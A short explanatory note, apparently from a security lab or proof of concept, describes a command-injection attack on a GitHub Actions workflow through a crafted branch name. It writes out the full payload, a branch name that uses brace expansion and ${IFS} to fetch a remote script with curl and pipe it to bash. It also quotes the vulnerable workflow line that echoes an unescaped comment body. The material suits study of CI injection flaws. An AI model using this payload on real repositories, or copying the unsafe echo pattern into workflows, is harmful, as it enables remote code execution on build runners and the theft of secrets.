# Attacker Branch Name Payload

The attacker creates a branch with this exact name:

  dev$({curl,-sSfL,http://host.docker.internal:8888/pwned}${IFS}|${IFS}bash)

When bash evaluates this inside an echo command:
- ${IFS} becomes a space
- {curl,-sSfL,...} expands to curl -sSfL ...
- $({...}) triggers command substitution -> executes the payload

## How it works

The vulnerable workflow uses:
  echo ${{ github.event.comment.body }} >> ./format-request/pr_head_ref

When the comment body contains the malicious branch name,
bash evaluates the command substitution and executes the payload.
